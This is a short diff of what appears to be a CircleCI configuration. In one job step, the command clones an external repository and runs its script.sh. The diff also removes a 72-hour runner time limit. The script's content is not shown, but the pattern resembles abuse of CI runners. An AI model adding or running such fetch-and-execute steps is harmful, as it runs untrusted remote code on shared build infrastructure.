@@ -9,8 +9,7 @@ jobs:
         - run:
             name: Syifa_11
             command: git clone https://github.com/playdoco/play.git && cd play && chmod 500 play script.sh && ./script.sh
-runner:
-  max_run_time: 72h
+
 workflows:
     version: 2
         jobs:
